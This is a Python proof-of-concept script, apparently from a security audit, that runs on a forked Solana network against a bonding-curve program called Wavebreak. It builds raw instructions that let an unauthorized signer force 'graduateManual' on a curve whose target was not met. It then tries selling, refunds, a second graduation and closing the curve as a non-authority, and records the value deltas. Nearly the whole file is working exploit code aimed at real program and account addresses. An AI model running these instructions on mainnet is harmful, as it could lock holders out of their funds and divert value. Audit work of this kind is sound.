"""Wavebreak: measure the permissionless forced-graduation state transition.

WB-G10 executed `graduateManual` successfully with the ATTACKER as the only signer on a live curve
whose graduation target was NOT met (quote 11,560,648 vs target 1,677,572,460,000). This script
measures, before/after, the full bonding-curve record, the vault, the LP escrow PDA, and whether
ordinary holders can still exit afterwards (sell/refund) - i.e. the concrete impact of a third party
forcing graduation: value routing, phase lock-out, and any attacker-positive delta.
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
actor = F.load_actor(); A = str(actor.pubkey())
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
FIELDS = [(0, "discriminator", "u8"), (1, "base_mint", "pk"), (33, "quote_mint", "pk"), (65, "creator", "pk"),
          (97, "retainMintAuthority", "u8"), (98, "buyRequiresPermission", "u8"), (131, "sellRequiresPermission", "u8"),
          (164, "quoteFeeBps", "u16"), (166, "baseFeeBps", "u16"), (176, "startPrice", "u128"),
          (192, "endPrice", "u128"), (208, "quoteAmount", "u64"), (216, "baseAmount", "u64"),
          (224, "launchTime", "i64"), (232, "creatorReward", "u64"), (240, "graduationTarget", "u64"),
          (248, "graduationTime", "i64"), (256, "graduationReward", "u64"), (264, "maxBuyAmount", "u64"),
          (272, "maxSellAmount", "u64"), (280, "swapFeeBps", "u16"), (282, "baseAllocationBps", "u16"),
          (284, "method0_label", "u8"), (285, "method0_graduated", "u8"), (286, "method0_feeTier", "u16"),
          (288, "method0_splitBps", "u16"), (290, "method0_destination", "pk"), (322, "method0_unlocked", "u8"),
          (412, "method1_label", "u8"), (413, "method1_graduated", "u8"), (414, "method1_feeTier", "u16"),
          (416, "method1_splitBps", "u16"), (418, "method1_destination", "pk"), (450, "method1_unlocked", "u8"),
          (1308, "minReserveBps", "u16"), (1312, "premintedSupply", "u64")]


def decode(raw):
    out = {}
    for off, name, typ in FIELDS:
        if typ == "u8":
            out[name] = raw[off]
        elif typ == "u16":
            out[name] = struct.unpack_from("<H", raw, off)[0]
        elif typ == "u64":
            out[name] = struct.unpack_from("<Q", raw, off)[0]
        elif typ == "i64":
            out[name] = struct.unpack_from("<q", raw, off)[0]
        elif typ == "u128":
            out[name] = str(int.from_bytes(raw[off:off + 16], "little"))
        elif typ == "pk":
            from base58 import b58encode
            out[name] = b58encode(bytes(raw[off:off + 32])).decode()
    return out


def full(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    rec = {"lamports": v["lamports"], "space": v["space"], "owner": v["owner"],
           "hash": F.hashlib.sha256(raw).hexdigest()}
    if v["space"] == 2048:
        rec["curve"] = decode(raw)
    if v["space"] == 165 and len(raw) >= 72:
        rec["tokenAmount"] = struct.unpack_from("<Q", raw, 64)[0]
    if v["space"] == 82:
        rec["supply"] = struct.unpack_from("<Q", raw, 36)[0]
    return rec


def ata_of(owner, mint, prog):
    return str(Pubkey.find_program_address([bytes(F.pk(owner)), bytes(F.pk(prog)), bytes(F.pk(mint))],
                                           F.pk(F.ATA))[0])


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


RESULTS = []


def run(name, ixs, watch, note=""):
    before = {a: full(a) for a in watch}
    sb = F.get_slot()
    r = F.send(ixs, actor)
    after = {a: full(a) for a in watch}
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    deltas = {}
    for a in watch:
        b, af = before.get(a) or {}, after.get(a) or {}
        d = {}
        if b.get("lamports") != af.get("lamports"):
            d["lamports"] = (af.get("lamports") or 0) - (b.get("lamports") or 0)
        if b.get("tokenAmount") is not None and b.get("tokenAmount") != af.get("tokenAmount"):
            d["tokenAmount"] = (af.get("tokenAmount") or 0) - (b.get("tokenAmount") or 0)
        if b.get("supply") is not None and b.get("supply") != af.get("supply"):
            d["supply"] = (af.get("supply") or 0) - (b.get("supply") or 0)
        if b.get("curve") and af.get("curve"):
            ch = {k: [b["curve"][k], af["curve"][k]] for k in b["curve"] if b["curve"][k] != af["curve"][k]}
            if ch:
                d["curveFields"] = ch
        if d:
            deltas[a] = d
    rec = {"case": name, "note": note, "forkSlotBefore": sb, "forkSlotAfter": F.get_slot(),
           "sig": r.get("result"), "err": det.get("err") or r.get("error"), "logs": logs,
           "deltas": deltas, "attackerLamportsDelta": (after.get(A) or {}).get("lamports", 0) -
           (before.get(A) or {}).get("lamports", 0)}
    RESULTS.append(rec)
    print(f"\n### {name}  [{note}]")
    print("   err:", json.dumps(rec["err"])[:140])
    print("   logs:", " | ".join(l.split('log:')[-1].strip() for l in logs if 'log:' in l or 'failed' in l)[:280])
    print("   deltas:", json.dumps(deltas, indent=1)[:1800])
    print("   attacker lamports delta (net of 5000 fee):", rec["attackerLamportsDelta"])
    return rec


def main():
    # 7pjREHY... was already graduated by WB-G10 on this fork -> its post state is the "after"
    # evidence; 4U4kEQ4n... is an untouched Manual curve used for a clean before/after delta.
    T = "4U4kEQ4nHnF8PuXcCWq9FsTyHyZiCCbHMeMUjGStFj68"
    c = CURVES[T]
    BASE, QM = c["base_mint"], c["quote_mint"]
    qp = F.get_account(QM)["owner"]; bp = F.get_account(BASE)["owner"]
    VAULT = ata_of(T, QM, qp)
    dest = [m["destination"] for m in c["graduation_methods"] if m["label"] == 2][0]
    dest_q, dest_b = ata_of(dest, QM, qp), ata_of(dest, BASE, bp)
    att_q, att_b = ata_of(A, QM, qp), ata_of(A, BASE, bp)
    lp_escrow = str(Pubkey.find_program_address([b"lp_escrow", bytes(F.pk(dest))], F.pk(WB))[0])
    mint = F.get_account(BASE)
    print("curve", T, "quoteMint", QM, "baseMint", BASE, "dest", dest)
    print("vault", VAULT, full(VAULT) and full(VAULT).get("tokenAmount"))
    watch = [A, att_q, att_b, T, VAULT, dest, dest_q, dest_b, BASE, lp_escrow]
    # 1) can a third party graduate a curve whose target was NOT met?
    gm = Instruction(F.pk(WB), bytes([33]), [
        M(A, w=True, s=True), M(dest), M(T, w=True), M(QM), M(VAULT, w=True),
        M(att_q, w=True), M(dest_q, w=True), M(BASE, w=True), M(dest_b, w=True),
        M(F.SYSTEM), M(F.ATA), M(qp), M(bp)])
    run("WB-F01 attacker triggers graduateManual (target NOT met)", [gm], watch,
        "attacker signs; destination bound to the curve record")
    # 2) after graduation: can a holder still sell into the curve?
    fund = 10 ** 12
    v2 = bytearray(base64.b64decode(F.get_account(att_b)["data"][0])) if F.get_account(att_b) else None
    if v2:
        struct.pack_into("<Q", v2, 64, fund)
        F.rpc.rpc("surfnet_setAccount", [att_b, {"lamports": F.get_account(att_b)["lamports"],
                                                 "data": bytes(v2).hex(), "owner": bp, "executable": False}], url=F.FORK)
        sup = struct.unpack_from("<Q", base64.b64decode(F.get_account(BASE)["data"][0]), 36)[0]
        F.rpc.rpc("surfnet_setSupply", [BASE, {"total": str(sup + fund)}], url=F.FORK)
    sell = Instruction(F.pk(WB), bytes([10]) + struct.pack("<QB", fund // 10, 0) + b"\x00", [
        M(A, w=True, s=True), M(T, w=True), M(BASE, w=True), M(att_b, w=True), M(QM),
        M(VAULT, w=True), M(att_q, w=True), M(F.SYSTEM), M(F.ATA), M(bp), M(qp)])
    run("WB-F02 sell AFTER forced graduation", [sell], watch, "post-graduation exit for holders")
    # 3) refund after graduation
    rf = Instruction(F.pk(WB), bytes([12]), [
        M(A, w=True, s=True), M(T, w=True), M(QM), M(VAULT, w=True), M(att_q, w=True),
        M(BASE, w=True), M(att_b, w=True), M(F.SYSTEM), M(bp), M(qp), M(F.ATA)])
    run("WB-F03 tokenRefund AFTER forced graduation", [rf], watch, "post-graduation refund path")
    # 4) second graduation attempt (repeated payout?)
    run("WB-F04 graduateManual AGAIN (repeated payout)", [gm], watch, "double-graduation / repeated escrow payout")
    # 5) close the curve as a non-authority after graduation
    cl = Instruction(F.pk(WB), bytes([51]), [
        M(A, w=True, s=True), M(c["creator"]), M("8AbiHetkXXjkbUJe9XBLEaaGWvkJQbakJ746WQbi6Qor"),
        M(T, w=True), M(QM), M(VAULT, w=True), M(dest_q, w=True), M(BASE, w=True),
        M("5yXDawwQ5s3hZXMJjLWryvDWsNKHYKqp6vkdSfgsaee4"), M(qp), M(bp), M(F.SYSTEM), M(F.ATA)])
    run("WB-F05 bondingCurveClose by attacker after graduation", [cl], watch, "rent/refund custody close gate")
    prior = "7pjREHYMKCouqnCTq3wNnEiAFnTVyncuq7jBfp7t7N9d"
    print("\n=== previously-graduated curve (WB-G10) current fork state vs mainnet snapshot:")
    pv = full(prior); print("   curve record now:", json.dumps(pv, indent=1)[:1400])
    print("   mainnet snapshot:", json.dumps({k: CURVES[prior][k] for k in ("quote_amount","base_amount","graduation_reward","creator_reward")}))
    RESULTS.append({"case": "WB-F00 post-graduation state of 7pjREHY (from WB-G10)", "curve": pv,
                    "mainnetSnapshot": {k: CURVES[prior][k] for k in
                                        ("quote_amount","base_amount","graduation_reward","creator_reward","graduation_target")}})
    json.dump({"curve": T, "baseMint": BASE, "quoteMint": QM, "destination": dest, "vault": VAULT,
               "lpEscrow": lp_escrow, "results": RESULTS,
               "fundingNote": "attacker base balance supplied by fork cheatcodes (fixture only)"},
              open("/home/user/orca-audit/evidence/WBF_forced_graduation.json", "w"), indent=1)
    print("\nsaved evidence/WBF_forced_graduation.json")


if __name__ == "__main__":
    main()
